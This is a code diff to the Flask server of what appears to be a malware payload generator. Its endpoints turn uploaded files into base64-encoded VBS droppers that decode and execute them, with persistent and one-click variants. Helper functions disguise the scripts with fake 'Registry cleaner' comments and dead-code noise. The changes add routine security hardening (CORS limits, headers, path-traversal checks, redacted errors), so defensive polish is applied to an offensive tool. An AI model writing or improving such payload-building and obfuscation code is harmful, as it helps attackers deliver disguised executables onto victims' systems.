@@ -8,6 +8,10 @@ from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 import os
 import uuid
+import base64
+import random
+import string
+import logging
 from datetime import datetime
 import json
 from pathlib import Path
@@ -18,8 +22,10 @@ from fingerprint_manager import FingerprintManager
 from payload_installer import create_one_click_payload
 from persistence_manager import create_persistent_payload
 
+logger = logging.getLogger(__name__)
+
 app = Flask(__name__)
-CORS(app)
+CORS(app, origins=os.environ.get('CORS_ORIGINS', 'http://localhost:3000').split(','))
 
 # Configuration
 UPLOAD_FOLDER = '/tmp/sc-uploads'
@@ -34,6 +40,67 @@ app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE
 
 payload_gen = PayloadGenerator()
 fingerprint_mgr = FingerprintManager()
+
+
+@app.after_request
+def set_security_headers(response):
+    """Add security headers to every response."""
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
+    response.headers['Content-Security-Policy'] = "default-src 'self'"
+    return response
+
+
+def _sanitize_file_id(file_id: str) -> str:
+    """Sanitize a file_id to prevent path traversal.
+
+    Returns the sanitized id or raises ValueError if invalid.
+    """
+    sanitized = os.path.basename(file_id)
+    if not sanitized or '/' in file_id or '\\' in file_id or '..' in file_id:
+        raise ValueError('Invalid file ID')
+    return sanitized
+
+
+def _find_uploaded_file(file_id: str):
+    """Find an uploaded file by its ID prefix.
+
+    Returns the full path to the file, or None if not found.
+    The file_id is sanitized before use.
+    """
+    safe_id = _sanitize_file_id(file_id)
+    for f in os.listdir(app.config['UPLOAD_FOLDER']):
+        if f.startswith(safe_id):
+            return os.path.join(app.config['UPLOAD_FOLDER'], f)
+    return None
+
+
+def _find_output_file(output_id: str):
+    """Find an output file by its ID prefix.
+
+    Checks for all known naming patterns:
+      - {id}_payload.vbs   (standard generate)
+      - {id}_persistent.vbs (persistent generate)
+      - {id}_{filename}     (one-click generate, dynamic name)
+
+    Returns the full path to the file, or None if not found.
+    """
+    safe_id = _sanitize_file_id(output_id)
+    for f in os.listdir(OUTPUT_FOLDER):
+        if f.startswith(safe_id + '_'):
+            return os.path.join(OUTPUT_FOLDER, f)
+    return None
+
+
+def _safe_error_message(prefix: str, exc: Exception) -> str:
+    """Return an error message that does not leak internal paths."""
+    msg = str(exc)
+    # Strip any absolute path information
+    for sensitive in (UPLOAD_FOLDER, OUTPUT_FOLDER, '/tmp', '/home'):
+        msg = msg.replace(sensitive, '<redacted>')
+    return f'{prefix}: {msg}'
 
 
 @app.route('/api/health', methods=['GET'])
@@ -211,7 +278,8 @@ def upload_file():
             'upload_time': datetime.now().isoformat()
         })
     except Exception as e:
-        return jsonify({'error': f'Upload failed: {str(e)}'}), 500
+        logger.exception('Upload failed')
+        return jsonify({'error': _safe_error_message('Upload failed', e)}), 500
 
 
 @app.route('/api/generate-payload', methods=['POST'])
@@ -230,11 +298,7 @@ def generate_payload():
 
     try:
         # Find uploaded file
-        uploaded_file = None
-        for f in os.listdir(app.config['UPLOAD_FOLDER']):
-            if f.startswith(file_id):
-                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
-                break
+        uploaded_file = _find_uploaded_file(file_id)
 
         if not uploaded_file or not os.path.exists(uploaded_file):
             return jsonify({'error': 'File not found'}), 404
@@ -252,7 +316,6 @@ def generate_payload():
             )
 
         # Convert to base64 for embedding in command
-        import base64
         encoded_file = base64.b64encode(file_content).decode()
 
         # Generate command that will decode and execute the file
@@ -292,35 +355,46 @@ def generate_payload():
             'timestamp': datetime.now().isoformat()
         })
 
+    except ValueError as e:
+        return jsonify({'error': str(e)}), 400
     except Exception as e:
-        return jsonify({'error': f'Payload generation failed: {str(e)}'}), 500
+        logger.exception('Payload generation failed')
+        return jsonify({'error': _safe_error_message('Payload generation failed', e)}), 500
 
 
 @app.route('/api/download/<output_id>', methods=['GET'])
 def download_payload(output_id):
     """Download generated payload"""
-    output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_payload.vbs")
+    try:
+        output_path = _find_output_file(output_id)
+    except ValueError:
+        return jsonify({'error': 'Invalid output ID'}), 400
 
-    if not os.path.exists(output_path):
+    if not output_path or not os.path.exists(output_path):
         return jsonify({'error': 'Output not found'}), 404
 
     try:
+        download_name = os.path.basename(output_path)
         return send_file(
             output_path,
             mimetype='text/plain',
             as_attachment=True,
-            download_name=f'payload_{output_id}.vbs'
+            download_name=download_name
         )
     except Exception as e:
-        return jsonify({'error': f'Download failed: {str(e)}'}), 500
+        logger.exception('Download failed')
+        return jsonify({'error': _safe_error_message('Download failed', e)}), 500
 
 
 @app.route('/api/preview/<output_id>', methods=['GET'])
 def preview_payload(output_id):
     """Preview generated payload"""
-    output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_payload.vbs")
+    try:
+        output_path = _find_output_file(output_id)
+    except ValueError:
+        return jsonify({'error': 'Invalid output ID'}), 400
 
-    if not os.path.exists(output_path):
+    if not output_path or not os.path.exists(output_path):
         return jsonify({'error': 'Output not found'}), 404
 
     try:
@@ -328,7 +402,8 @@ def preview_payload(output_id):
             content = f.read()
         return jsonify({'content': content})
     except Exception as e:
-        return jsonify({'error': f'Preview failed: {str(e)}'}), 500
+        logger.exception('Preview failed')
+        return jsonify({'error': _safe_error_message('Preview failed', e)}), 500
 
 
 @app.route('/api/settings', methods=['GET'])
@@ -350,7 +425,6 @@ def add_vbs_comments(vbs_code: str) -> str:
         "' Registry cleaner",
         "' Performance monitor",
     ]
-    import random
     lines = vbs_code.split('\n')
     for i in range(1, len(lines), random.randint(3, 7)):
         lines.insert(i, random.choice(comments))
@@ -359,9 +433,6 @@ def add_vbs_comments(vbs_code: str) -> str:
 
 def add_vbs_noise(vbs_code: str) -> str:
     """Add noise/dead code to VBS for obfuscation"""
-    import random
-    import string
-
     noise = f"""
 Dim {random.choice(string.ascii_lowercase)}{random.randint(1, 99)}
 On Error Resume Next
